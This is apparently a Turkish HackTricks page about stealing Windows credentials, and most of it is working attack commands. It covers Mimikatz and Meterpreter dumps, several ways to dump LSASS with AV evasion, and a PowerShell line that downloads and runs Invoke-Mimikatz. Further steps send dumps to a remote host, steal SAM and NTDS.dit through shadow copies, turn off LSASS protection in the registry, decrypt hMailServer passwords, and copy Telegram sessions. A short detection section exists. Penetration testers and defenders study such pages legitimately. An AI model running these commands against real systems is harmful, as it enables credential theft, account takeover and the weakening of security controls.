# Windows Kimlik Bilgilerini Ele Geçirme

{{#include ../../banners/hacktricks-training.md}}

## Kimlik Bilgileri Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Mimikatz'in yapabileceği diğer şeyleri [bu sayfada](credentials-mimikatz.md) bulabilirsiniz.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Bazı olası kimlik bilgisi korumaları hakkında buradan bilgi edinin.**](credentials-protections.md) **Bu korumalar, Mimikatz'in bazı kimlik bilgilerini çıkarmasını engelleyebilir.**

## Meterpreter ile Kimlik Bilgileri

Kurbanın içinde **parolaları ve hash'leri aramak** için oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) aracını kullanın.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV'yi Atlatma

### Procdump + Mimikatz

[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **Procdump meşru bir Microsoft aracı olduğundan**, Defender tarafından algılanmaz.\
Bu aracı **lsass sürecinin dump'ını almak**, **dump'ı indirmek** ve dump'taki **kimlik bilgilerini yerel olarak çıkarmak** için kullanabilirsiniz.

[SharpDump](https://github.com/GhostPack/SharpDump) da kullanabilirsiniz.

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak gerçekleştirilir: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Not**: Bazı **AV** yazılımları, **lsass.exe'yi dump etmek için procdump.exe kullanılmasını** **zararlı** olarak **tespit edebilir**; bunun nedeni **"procdump.exe" ve "lsass.exe"** dizelerini **tespit etmeleridir**. Bu nedenle, **procdump'a** `lsass.exe` **adını vermek yerine** lsass.exe'nin **PID'sini argüman** olarak **iletmek** daha **gizlidir**.

### **comsvcs.dll** ile lsass dump etme

`C:\Windows\System32` dizininde bulunan **comsvcs.dll** adlı bir DLL, çökme durumunda **process belleğini dump etmekten** sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmış **`MiniDumpW`** adlı bir **işlev** içerir.\
İlk iki argümanın kullanılması önemli değildir, ancak üçüncü argüman üç bileşene ayrılır. Dump edilecek process'in ID'si ilk bileşeni, dump dosyasının konumu ikinci bileşeni oluşturur; üçüncü bileşen ise kesinlikle **full** sözcüğü olmalıdır. Başka seçenek yoktur.\
Bu üç bileşen ayrıştırıldıktan sonra DLL, dump dosyasını oluşturur ve belirtilen process'in belleğini bu dosyaya aktarır.\
**comsvcs.dll** kullanılarak lsass process'i dump edilebilir; böylece procdump'ı yükleyip çalıştırmaya gerek kalmaz. Bu yöntem [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde ayrıntılı olarak açıklanmıştır.<sup>[[9]](#references)</sup>

Çalıştırmak için aşağıdaki komut kullanılır:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Bu süreci [**lssasy**](https://github.com/Hackndo/lsassy) ile otomatikleştirebilirsiniz.**

### **Task Manager ile lsass dökümü alma**

1. Task Bar'a sağ tıklayın ve Task Manager'a tıklayın.
2. More details'a tıklayın.
3. Processes sekmesinde "Local Security Authority Process" sürecini bulun.
4. "Local Security Authority Process" sürecine sağ tıklayın ve "Create dump file" seçeneğine tıklayın.

### procdump ile lsass dökümü alma

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçası olan, Microsoft tarafından imzalanmış bir binary'dir.

Önceden oluşturulmuş tam sistem çökme dökümü veya erişilebilir bir kullanıcı klasöründeki sıkıştırılmış kopyası, çevrimdışı analiz için kimlik bilgisi materyali içerebilir. `MEMORY.DMP` ve `MEMORY.7z` gibi dosya adları yalnızca inceleme için ipucu niteliğindedir: kaynağını ve erişimi doğrulayın; kullanılabilir veya güncel kimlik bilgileri içerdiğini varsaymayın.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## PPLBlade ile lsass Dumping

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade), bellek dump'ını obfuscate etmeyi ve diske kaydetmeden uzak iş istasyonlarına aktarmayı destekleyen bir Protected Process Dumper Tool'dur.

**Temel işlevler**:

1. PPL korumasını atlatma
2. Defender'ın imza tabanlı algılama mekanizmalarından kaçınmak için bellek dump dosyalarını obfuscate etme
3. Bellek dump'ını diske kaydetmeden RAW ve SMB yükleme yöntemleriyle yükleme (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – MiniDumpWriteDump kullanmadan SSP tabanlı LSASS dökümü alma

Ink Dragon, `MiniDumpWriteDump` işlevini hiç çağırmayan ve bu nedenle bu API üzerindeki EDR hook’larını tetiklemeyen, **LalsDumper** adlı üç aşamalı bir dumper kullanıyor:<sup>[[3]](#references)</sup>

1. **Aşama 1 yükleyicisi (`lals.exe`)** – `fdp.dll` içinde 32 küçük `d` karakterinden oluşan bir yer tutucu arar, bu yer tutucuyu `rtu.txt` dosyasının mutlak yolu ile değiştirir, yamalanmış DLL’yi `nfdp.dll` olarak kaydeder ve `AddSecurityPackageA("nfdp","fdp")` çağrısını yapar. Böylece **LSASS**, kötü amaçlı DLL’yi yeni bir Security Support Provider (SSP) olarak yüklemeye zorlanır.
2. **LSASS içindeki Aşama 2** – LSASS `nfdp.dll` dosyasını yüklediğinde DLL, `rtu.txt` dosyasını okur, her baytı `0x20` ile XOR’lar ve yürütmeyi devretmeden önce kodu çözülmüş blob’u belleğe eşler.
3. **Aşama 3 dumper** – Eşlenen payload, hash’lenmiş API adlarından çözümlenen **doğrudan syscall**’ları kullanarak MiniDump mantığını yeniden uygular (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom` adlı özel bir export, `%TEMP%\<pid>.ddt` dosyasını açar, sıkıştırılmış LSASS dökümünü dosyaya yazar ve handle’ı kapatır; böylece veri daha sonra dışarı sızdırılabilir.

Operatör notları:

* `lals.exe`, `fdp.dll`, `nfdp.dll` ve `rtu.txt` dosyalarını aynı dizinde tutun. Aşama 1, sabit kodlanmış yer tutucuyu `rtu.txt` dosyasının mutlak yolu ile değiştirir; bu nedenle dosyaları farklı konumlara koymak zinciri bozar.
* Kayıt, `nfdp` değerinin `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` konumuna eklenmesiyle yapılır. LSASS’in SSP’yi her açılışta yeniden yüklemesini sağlamak için bu değeri kendiniz ekleyebilirsiniz.
* `%TEMP%\*.ddt` dosyaları sıkıştırılmış dökümlerdir. Sıkıştırmayı yerel olarak açın, ardından kimlik bilgilerini çıkarmak için dosyaları Mimikatz/Volatility araçlarına verin.
* `AddSecurityPackageA` çağrısının başarılı olması için `lals.exe` yönetici/SeTcb haklarıyla çalıştırılmalıdır; çağrı döndüğünde LSASS, kötü amaçlı SSP’yi şeffaf biçimde yükler ve Aşama 2’yi yürütür.
* DLL’yi diskten silmek, onu LSASS’ten kaldırmaz. Kayıt defteri girdisini silip LSASS’i yeniden başlatın (sistemi yeniden başlatın) ya da uzun süreli kalıcılık için olduğu gibi bırakın.

## CrackMapExec

### SAM hash’lerini dökme

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### LSA secrets dökümü

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Hedef DC'den NTDS.dit'i döküm olarak al

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Hedef DC'den NTDS.dit parola geçmişini dökme

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Her NTDS.dit hesabının pwdLastSet özniteliğini göster

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM ve SYSTEM'i Çalma

Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM_ konumlarında **bulunmalıdır**. Ancak **korunduklarından bunları normal şekilde kopyalayamazsınız**.

### Registry'den

Bu dosyaları çalmanın en kolay yolu, Registry'den bir kopya almaktır:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Bu dosyaları** Kali makinenize **indirin** ve aşağıdakini kullanarak **hash'leri çıkarın**:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Bu hizmeti kullanarak korumalı dosyaların kopyalarını oluşturabilirsiniz. Yönetici olmanız gerekir.

#### vssadmin kullanımı

vssadmin yürütülebilir dosyası yalnızca Windows Server sürümlerinde kullanılabilir.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Ancak aynı şeyi **Powershell** üzerinden de yapabilirsiniz. Bu, **SAM dosyasının nasıl kopyalanacağına** dair bir örnektir (kullanılan sürücü "C:" ve dosya C:\users\Public konumuna kaydedilir), ancak bunu korunan herhangi bir dosyayı kopyalamak için kullanabilirsiniz:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Kitaptaki kod: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Son olarak, SAM, SYSTEM ve ntds.dit dosyalarının bir kopyasını oluşturmak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) aracını da kullanabilirsiniz.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory Kimlik Bilgileri - NTDS.dit**

**NTDS.dit** dosyası, kullanıcı nesneleri, gruplar ve bunların üyelikleri hakkında kritik verileri barındıran **Active Directory**'nin kalbi olarak bilinir. Etki alanı kullanıcılarının **password hash**'leri burada saklanır. Bu dosya bir **Extensible Storage Engine (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.

Bu veritabanında üç temel tablo tutulur:

- **Data Table**: Kullanıcılar ve gruplar gibi nesneler hakkındaki ayrıntıları saklamakla görevlidir.
- **Link Table**: Grup üyelikleri gibi ilişkileri izler.
- **SD Table**: Her nesnenin **security descriptor**'ları burada tutulur ve saklanan nesnelerin güvenliği ile erişim denetimi sağlanır.

Christoffer Andersson'ın veritabanı katmanına ilişkin araştırması, bu tabloları ve sürüme özgü davranışlarını daha ayrıntılı olarak belgeliyor.<sup>[[8]](#references)</sup>

Windows, bu dosyayla etkileşim kurmak için _Ntdsa.dll_ kullanır ve bu dosya _lsass.exe_ tarafından kullanılır. Ardından, **NTDS.dit** dosyasının bir **bölümü** **`lsass` belleğinde** bulunabilir (performansı artırmak için **cache** kullanılması sayesinde muhtemelen en son erişilen verileri bulabilirsiniz).

#### NTDS.dit içindeki hash'lerin şifresini çözme

Hash üç kez şifrelenir:

1. Password Encryption Key (**PEK**) anahtarının şifresini **BOOTKEY** ve **RC4** kullanarak çözün.
2. **Hash**'in şifresini **PEK** ve **RC4** kullanarak çözün.
3. **Hash**'in şifresini **DES** kullanarak çözün.

**PEK**, her etki alanı denetleyicisinde **aynı değere** sahiptir; ancak bu anahtar, ilgili etki alanı denetleyicisinin **SYSTEM** hive'ındaki DC'ye özgü **BOOTKEY** ile **NTDS.dit** içinde **şifrelenir**. Bu nedenle kimlik bilgilerini çıkarmak için hem **NTDS.dit** hem de **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) gerekir.

### Ntdsutil kullanarak NTDS.dit dosyasını kopyalama

Windows Server 2008'den beri kullanılabilir.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Ayrıca **ntds.dit** dosyasını kopyalamak için [**volume shadow copy**](#stealing-sam-and-system) yöntemini de kullanabilirsiniz. **SYSTEM file** dosyasının da bir kopyasına ihtiyacınız olacağını unutmayın (yine [**registry'den dökümünü alın veya volume shadow copy yöntemini kullanın**](#stealing-sam-and-system)).

### **NTDS.dit dosyasından hash'leri çıkarma**

**NTDS.dit** ve **SYSTEM** dosyalarını **edindikten** sonra, hash'leri **çıkarmak** için _secretsdump.py_ gibi araçları kullanabilirsiniz:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Bunları geçerli bir domain admin kullanıcısı kullanarak otomatik olarak da çıkarabilirsiniz:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

**Büyük NTDS.dit dosyalarının** [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanılarak çıkarılması önerilir.

Son olarak, **metasploit modülünü** de kullanabilirsiniz: _post/windows/gather/credentials/domain_hashdump_ veya **mimikatz** `lsadump::lsa /inject`

### **NTDS.dit dosyasındaki domain nesnelerini bir SQLite veritabanına çıkarma**

NTDS nesneleri, [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Yalnızca sırlar değil, ham NTDS.dit dosyası zaten alındığında daha fazla bilgi çıkarmak için nesnelerin tamamı ve öznitelikleri de çıkarılır.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hive isteğe bağlıdır ancak secrets şifre çözmeye olanak tanır (NT ve LM hash'leri, cleartext parolalar gibi ek kimlik bilgileri, kerberos veya trust anahtarları, NT ve LM parola geçmişleri). Diğer bilgilerin yanı sıra şu veriler çıkarılır: hash'leriyle birlikte kullanıcı ve makine hesapları, UAC bayrakları, son oturum açma ve parola değiştirme zaman damgaları, hesap açıklamaları, adlar, UPN, SPN, gruplar ve özyinelemeli üyelikler, organizasyon birimlerinin ağacı ve üyelikleri, trust türü, yönü ve öznitelikleriyle birlikte güvenilen etki alanları...

## Lazagne

Binary dosyasını [buradan](https://github.com/AlessandroZ/LaZagne/releases) indirin. Bu binary dosyasını çeşitli yazılımlardan kimlik bilgilerini çıkarmak için kullanabilirsiniz.

```
lazagne.exe all
```

## SAM ve LSASS'ten kimlik bilgilerini çıkarmak için diğer araçlar

### Windows credentials Editor (WCE)

Bu araç, bellekten kimlik bilgilerini çıkarmak için kullanılabilir. Şuradan indirin: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarın

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

SAM dosyasından kimlik bilgilerini çıkar

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Buradan indirin:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) ve yalnızca **çalıştırın**; parolalar çıkarılır.

## Boşta kalan RDP oturumlarını inceleme ve güvenlik kontrollerini zayıflatma

Ink Dragon’ın FinalDraft RAT’i, teknikleri tüm red-teamer’lar için kullanışlı olan bir `DumpRDPHistory` tasker’ı içerir:<sup>[[3]](#references)</sup>

### DumpRDPHistory tarzı telemetri toplama

* **Giden RDP hedefleri** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` konumundaki her kullanıcı hive’ını ayrıştırın. Her alt anahtar sunucu adını, `UsernameHint` değerini ve son yazma zaman damgasını saklar. FinalDraft’ın mantığını PowerShell ile taklit edebilirsiniz:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Gelen RDP kanıtları** – kutuyu kimin yönettiğini belirlemek için `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` günlüğünde **21** (başarılı oturum açma) ve **25** (bağlantı kesilmesi) Olay Kimliklerini sorgulayın:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Hangi Domain Admin’in düzenli olarak bağlandığını öğrendikten sonra, **bağlantısı kesilmiş** oturumu hâlâ mevcutken LSASS’ı (LalsDumper/Mimikatz ile) dökümleyin. CredSSP + NTLM fallback, doğrulayıcılarını ve token’larını LSASS’ta bırakır; bunlar daha sonra SMB/WinRM üzerinden yeniden oynatılarak `NTDS.dit` alınabilir veya domain controller’larda kalıcılık sağlanabilir.

### FinalDraft’in hedeflediği Registry düşürmeleri

Aynı implant, credential hırsızlığını kolaylaştırmak için birkaç registry key’e de müdahale eder:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` ayarlandığında RDP sırasında kimlik bilgisi/ticket yeniden kullanımı zorunlu hâle gelir ve pass-the-hash tarzı geçişler mümkün olur.
* `LocalAccountTokenFilterPolicy=1`, UAC token filtrelemesini devre dışı bırakır; böylece yerel yöneticiler ağ üzerinden kısıtlanmamış token'lar alır.
* `DSRMAdminLogonBehavior=2`, DC çevrimiçiyken DSRM yöneticisinin oturum açmasına izin verir ve saldırganlara yerleşik, yüksek ayrıcalıklı başka bir hesap sağlar.
* `RunAsPPL=0`, LSASS PPL korumalarını kaldırarak LalsDumper gibi dökücüler için belleğe erişimi kolaylaştırır.

## hMailServer yapılandırma kimlik bilgileri (ihlâl sonrası)

Kurulum düzenine göre `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` ve `C:\ProgramData\hMailServer\hMailServer.ini` yapılandırma dosyalarının tam yollarını kontrol edin. Okunabilir ve boş olmayan bir `[Security] AdministratorPassword=` değeri, hMailServer yönetici parolası hash'idir; bu, bir Windows Administrator parolasının kanıtı değildir. Bu kimlik bilgisi elde edilirse, herhangi bir Windows hesabına geçiş için parola yeniden kullanımının ve oturum açma haklarının ayrıca doğrulanması gerekir.

SQL CE veritabanı kullanan kurulumlarda, INI dosyasındaki ayrı `[Database] Password=` değeri veritabanını korur. Eski kurulumlarda bu değer, statik `THIS_KEY_IS_NOT_SECRET` anahtarı ve 4 baytlık sözcük endian dönüşümleri kullanılarak Blowfish ile şifrelenir. INI dosyasındaki hex dizgesini şu Python kod parçacığıyla kullanın:<sup>[[2]](#references)</sup>

Öncelikle mevcut hesabın hem INI dosyasını hem de ilgili SQL CE `.sdf` veritabanını okuyabildiğini doğrulayın. INI parolası veritabanını korur; veritabanında saklanan posta kutusu hesabı hash'lerinden ayrıdır. Kullanımdaki bir veritabanını incelemek veya yükseltmek için canlı dosyayı değil, bir **kopyasını** kullanın.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Düz metin parolayla, dosya kilitlerini önlemek için SQL CE veritabanını kopyalayın, 32 bit sağlayıcıyı yükleyin ve hash'leri sorgulamadan önce gerekiyorsa yükseltin:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

`accountpassword` sütunu hMailServer hash formatını kullanır (hashcat mode `1421`). Kırılmış bir mailbox parolası, yalnızca bu parola bir local/domain hesap tarafından yeniden kullanılıyorsa ve bu hesap gerekli remote-logon haklarına sahipse Windows user pivot'u sağlar.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Bazı araçlar, LSA logon callback'i `LsaApLogonUserEx2`'yi intercept ederek **plaintext logon parolalarını** yakalar. Amaç, kimlik bilgilerinin **logon sırasında** (hash'lenmeden önce) yakalanması için authentication package callback'ini hook'lamak veya sarmalamak ve ardından bunları diske yazmak ya da operatöre döndürmektir. Bu genellikle LSA'ya inject olan veya LSA'ya kaydolan, ardından başarılı her interactive/network logon olayındaki username, domain ve parolayı kaydeden bir helper olarak uygulanır.<sup>[[1]](#references)</sup>

Operasyonel notlar:
- Helper'ı authentication path'e yüklemek için local admin/SYSTEM gerekir.
- Yakalanan kimlik bilgileri yalnızca bir logon gerçekleştiğinde görünür (hook'a bağlı olarak interactive, RDP, service veya network logon).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS), kaydedilmiş bağlantı bilgilerini kullanıcı başına bir `sqlstudio.bin` dosyasında saklar. Özel dump araçları dosyayı ayrıştırıp kaydedilmiş SQL kimlik bilgilerini kurtarabilir. Yalnızca komut çıktısı döndüren shell'lerde dosya genellikle Base64 olarak kodlanıp stdout'a yazdırılarak exfiltrate edilir.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Operatör tarafında, dosyayı yeniden oluşturun ve kimlik bilgilerini kurtarmak için dumper'ı yerel olarak çalıştırın:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Chrome DevTools Protocol üzerinden browser oturumu ve cookie hırsızlığı

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Telegram Desktop `tdata` oturumu hırsızlığı

Telegram Desktop, yetkilendirme ve hesap durumunu **`tdata`** dizininde tutar. Kopyalanan bir oturum, yetkilendirme geçerli olduğu sürece hesap parolası olmadan kimlik doğrulaması yapmak için uyumlu araçlarla yüklenebilir; yerel veri şifrelemesi etkinse stealer'ın geçiş koduna da ihtiyacı vardır. Kimliği doğrulanmış bir oturum; kimlik verilerini, sohbet ve üyelik meta verilerini, mesajları ve indirilebilir medyayı açığa çıkarabilir.<sup>[[10]](#references)</sup>

### Keşif ve edinme

Hem yüklü hem de taşınabilir düzenleri arayın; Microsoft Store paket adları değişiklik gösterdiğinden `TelegramMessenge` içeren paket dizinlerini listeleyin ve `LocalCache\Roaming` alt ağacını inceleyin.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Normal okuma başarısız olursa ve işlem belirteci `SeBackupPrivilege` ayrıcalığını **zaten içeriyor ve etkinleştirmişse**, backup-aware erişim bir alternatif sunar; ayrıcalığı edinmez veya işlemi yükseltmez. `CreateFileW`, `FILE_FLAG_BACKUP_SEMANTICS` ile backup/restore semantiği isteyebilir ve gerekli belirteç ayrıcalıkları mevcutsa dosya güvenlik denetimlerini aşabilir; ancak bu bayrak tek başına uyumsuz bir paylaşım kilidini aşmaz.<sup>[[10]](#references)[[11]](#references)</sup>

Kullanımda olan kilitli dosyalar için bir **Volume Shadow Copy** oluşturun/okuyun; ACL nedeniyle erişilemeyen dosyalar için `robocopy /B`, backup mode'u kullanır ve dosya ile dizin ACL'lerini aşar.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Bir bant genişliğine duyarlı implant önce yalnızca dosya yolu envanterini gönderebilir, C2 tarafından zaten depolanmış yollarla birlikte bir anlık görüntü tanımlayıcısı alabilir ve yalnızca eksik dosyaları yükleyebilir. Bu nedenle, özyinelemeli `tdata` numaralandırmasından sonra gerçekleşen küçük artımlı aktarımlar bile başarılı bir oturum hırsızlığına işaret edebilir.<sup>[[10]](#references)</sup>

### Tespit ve sınırlama

Telegram dışı bir süreç tarafından `tdata` dizinine özyinelemeli erişimi; `SeBackupPrivilege` etkinleştirilmesi, yedekleme semantiğiyle dosya açılması, VSS etkinliği veya `/B` kullanan bir alt süreç `robocopy.exe` ile ilişkilendirin. Ayrıca, aynı süreçten dışa dönük bağlantılar kurulmadan önce hem `%APPDATA%` hem de `%LOCALAPPDATA%\Packages` dizinlerinin hızla numaralandırılıp numaralandırılmadığını araştırın. Ele geçirilmenin ardından, tanımadığınız oturumları sonlandırmak için **Ayarlar → Cihazlar** (veya **Gizlilik ve Güvenlik → Etkin Oturumlar**) bölümünü kullanın; yalnızca iki adımlı doğrulamayı etkinleştirmek, önceden çalınmış bir yetkilendirmeyi iptal etmez.<sup>[[10]](#references)[[13]](#references)</sup>

## Windows'ta Chrome'dan Passkeys / WebAuthn kimlik bilgisi hırsızlığı

**Google Password Manager ile senkronize passkeys** kullanan bir Windows ana bilgisayarında **kurban kullanıcı** olarak kod yürütme elde edilirse, passkeys **admin/SYSTEM yetkisi olmadan bile** ele geçirme sonrası için ilgi çekici bir hedeftir.<sup>[[4]](#references)</sup>

### İlgi çekici yerel yapıtlar

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

